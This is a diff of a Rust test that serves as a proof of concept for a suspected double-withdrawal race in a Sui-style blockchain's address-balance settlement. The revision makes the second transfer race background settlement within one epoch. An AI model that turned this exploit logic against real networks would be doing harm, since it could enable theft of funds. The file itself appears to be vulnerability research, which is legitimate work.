@@ -7,15 +7,11 @@ use test_cluster::addr_balance_test_env::TestEnvBuilder;
 
 #[tokio::test]
 async fn poc_double_withdrawal_across_epoch_boundary() {
-    let mut test_env = TestEnvBuilder::new()
-        .with_test_cluster_builder_cb(Box::new(|builder| {
-            builder.with_epoch_duration_ms(10000)
-        }))
-        .build()
-        .await;
+    let mut test_env = TestEnvBuilder::new().build().await;
     let sender = test_env.get_sender(0);
     test_env.fund_one_address_balance(sender, 1000).await;
-    println!("Deposited: 1000 MIST at epoch 0");
+    println!("Deposited: 1000 MIST");
+
     let tx_a = test_env
         .tx_builder(sender)
         .transfer_sui_to_address_balance(
@@ -24,9 +20,11 @@ async fn poc_double_withdrawal_across_epoch_boundary() {
         )
         .build();
     test_env.exec_tx_directly(tx_a).await.unwrap();
-    println!("TX-A (epoch 0): success");
-    test_env.cluster.wait_for_epoch(Some(1)).await;
-    println!("Epoch 1 reached naturally");
+    println!("TX-A: success");
+
+    // Submit TX-B IMMEDIATELY before settlement runs
+    // In production: settlement is in checkpoint K+1
+    // Here: we race against the background settlement
     let tx_b = test_env
         .tx_builder(sender)
         .transfer_sui_to_address_balance(
@@ -34,8 +32,11 @@ async fn poc_double_withdrawal_across_epoch_boundary() {
             vec![(1000, dbg_addr(3))],
         )
         .build();
+
     match test_env.exec_tx_directly(tx_b).await {
-        Ok(_) => println!("CRITICAL: TX-B SUCCEEDED = DOUBLE WITHDRAWAL"),
+        Ok(_) => println!("CRITICAL: TX-B SUCCEEDED = DOUBLE WITHDRAWAL IN SAME EPOCH"),
         Err(e) => println!("TX-B failed: {}", e),
     }
+
+    test_env.trigger_reconfiguration().await;
 }
